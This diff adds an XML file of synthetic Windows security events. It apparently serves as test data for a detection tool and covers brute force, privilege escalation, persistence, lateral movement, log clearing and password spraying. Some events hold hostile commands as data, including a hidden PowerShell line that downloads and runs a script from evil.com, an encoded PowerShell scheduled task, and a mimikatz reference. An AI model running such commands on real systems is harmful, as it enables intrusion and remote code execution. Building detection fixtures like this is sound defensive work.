@@ -1,0 +1,180 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Events>
+
+<!-- ══ BRUTE FORCE: Multiple failed logins (4625) ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T08:00:01.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">185.220.101.34</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">Unknown user name or bad password</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T08:00:02.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">185.220.101.34</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">Unknown user name or bad password</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T08:00:03.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">185.220.101.34</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T08:00:04.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">185.220.101.34</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T08:00:05.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">185.220.101.34</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T08:00:06.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">185.220.101.34</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T08:00:07.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">185.220.101.34</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+
+<!-- ══ ACCOUNT LOCKOUT (4740) ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4740</EventID><TimeCreated SystemTime="2024-01-10T08:01:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">Administrator</Data><Data Name="SubjectUserName">SYSTEM</Data><Data Name="IpAddress">185.220.101.34</Data></EventData>
+</Event>
+
+<!-- ══ SUCCESSFUL LOGON (4624) ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4624</EventID><TimeCreated SystemTime="2024-01-10T08:30:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="LogonType">3</Data><Data Name="AuthenticationPackageName">NTLM</Data></EventData>
+</Event>
+
+<!-- ══ SPECIAL PRIVILEGES ASSIGNED (4672) — Privilege Escalation ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4672</EventID><TimeCreated SystemTime="2024-01-10T08:31:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="PrivilegeList">SeDebugPrivilege SeImpersonatePrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4672</EventID><TimeCreated SystemTime="2024-01-10T08:32:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="PrivilegeList">SeDebugPrivilege SeImpersonatePrivilege</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4672</EventID><TimeCreated SystemTime="2024-01-10T08:33:00.000Z"/><Computer>SERVER02</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="PrivilegeList">SeDebugPrivilege</Data></EventData>
+</Event>
+
+<!-- ══ NEW USER ACCOUNT CREATED (4720) — Persistence ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4720</EventID><TimeCreated SystemTime="2024-01-10T09:00:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">backdoor_svc</Data><Data Name="SubjectUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data></EventData>
+</Event>
+
+<!-- ══ MEMBER ADDED TO PRIVILEGED GROUP (4728/4732) ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4728</EventID><TimeCreated SystemTime="2024-01-10T09:01:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="MemberName">backdoor_svc</Data><Data Name="GroupName">Domain Admins</Data><Data Name="SubjectUserName">john.doe</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4732</EventID><TimeCreated SystemTime="2024-01-10T09:02:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="MemberName">backdoor_svc</Data><Data Name="GroupName">Administrators</Data><Data Name="SubjectUserName">john.doe</Data></EventData>
+</Event>
+
+<!-- ══ SCHEDULED TASK CREATED (4698) — Persistence ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4698</EventID><TimeCreated SystemTime="2024-01-10T09:05:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="TaskName">\Microsoft\Windows\MaliciousTask</Data><Data Name="TaskContent">cmd.exe /c powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQA</Data></EventData>
+</Event>
+
+<!-- ══ NEW SERVICE INSTALLED (7045) — Persistence ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>7045</EventID><TimeCreated SystemTime="2024-01-10T09:10:00.000Z"/><Computer>SERVER01</Computer><Channel>System</Channel></System>
+ <EventData><Data Name="ServiceName">WinUpdate32</Data><Data Name="ImagePath">C:\Windows\Temp\svchost32.exe -k netsvcs</Data><Data Name="ServiceType">User Mode Service</Data><Data Name="StartType">Auto Start</Data></EventData>
+</Event>
+
+<!-- ══ LATERAL MOVEMENT — Network Logons (4624 Type 3) to multiple hosts ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4624</EventID><TimeCreated SystemTime="2024-01-10T09:15:00.000Z"/><Computer>SERVER02</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4624</EventID><TimeCreated SystemTime="2024-01-10T09:16:00.000Z"/><Computer>FILESERVER01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4624</EventID><TimeCreated SystemTime="2024-01-10T09:17:00.000Z"/><Computer>DBSERVER01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4624</EventID><TimeCreated SystemTime="2024-01-10T09:18:00.000Z"/><Computer>BACKUPSERVER</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+
+<!-- ══ EXPLICIT CREDENTIAL LOGON (4648) — Pass-the-Hash ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4648</EventID><TimeCreated SystemTime="2024-01-10T09:20:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="TargetUserName">Administrator</Data><Data Name="IpAddress">10.10.0.5</Data><Data Name="ProcessName">C:\Windows\System32\mimikatz.exe</Data></EventData>
+</Event>
+
+<!-- ══ PROCESS CREATION (4688) — Suspicious Commands ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4688</EventID><TimeCreated SystemTime="2024-01-10T09:25:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="CommandLine">cmd.exe /c whoami /all</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4688</EventID><TimeCreated SystemTime="2024-01-10T09:26:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="NewProcessName">C:\Windows\System32\net.exe</Data><Data Name="CommandLine">net user /domain</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4688</EventID><TimeCreated SystemTime="2024-01-10T09:27:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')</Data></EventData>
+</Event>
+
+<!-- ══ AUDIT LOG CLEARED (1102) — Defense Evasion ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>1102</EventID><TimeCreated SystemTime="2024-01-10T10:00:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="SubjectDomainName">CORP</Data></EventData>
+</Event>
+
+<!-- ══ REGISTRY MODIFICATION (4657) ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4657</EventID><TimeCreated SystemTime="2024-01-10T10:05:00.000Z"/><Computer>WORKSTATION01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="ObjectName">\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data><Data Name="NewValue">C:\Windows\Temp\malware.exe</Data></EventData>
+</Event>
+
+<!-- ══ PASSWORD RESET (4724) ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4724</EventID><TimeCreated SystemTime="2024-01-10T10:10:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">alice</Data><Data Name="SubjectUserName">john.doe</Data><Data Name="IpAddress">10.10.0.5</Data></EventData>
+</Event>
+
+<!-- ══ ACCOUNT DISABLED (4725) ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4725</EventID><TimeCreated SystemTime="2024-01-10T10:11:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">alice</Data><Data Name="SubjectUserName">john.doe</Data></EventData>
+</Event>
+
+<!-- ══ ADDITIONAL FAILED LOGINS — Password Spray ══ -->
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T11:00:00.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">alice</Data><Data Name="IpAddress">192.168.100.55</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T11:00:01.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">bob</Data><Data Name="IpAddress">192.168.100.55</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T11:00:02.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">sysadmin</Data><Data Name="IpAddress">192.168.100.55</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T11:00:03.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">helpdesk</Data><Data Name="IpAddress">192.168.100.55</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T11:00:04.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">serviceacct</Data><Data Name="IpAddress">192.168.100.55</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T11:00:05.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">backup</Data><Data Name="IpAddress">192.168.100.55</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+ <System><EventID>4625</EventID><TimeCreated SystemTime="2024-01-10T11:00:06.000Z"/><Computer>DC01</Computer><Channel>Security</Channel></System>
+ <EventData><Data Name="TargetUserName">dbadmin</Data><Data Name="IpAddress">192.168.100.55</Data><Data Name="LogonType">3</Data></EventData>
+</Event>
+
+</Events>
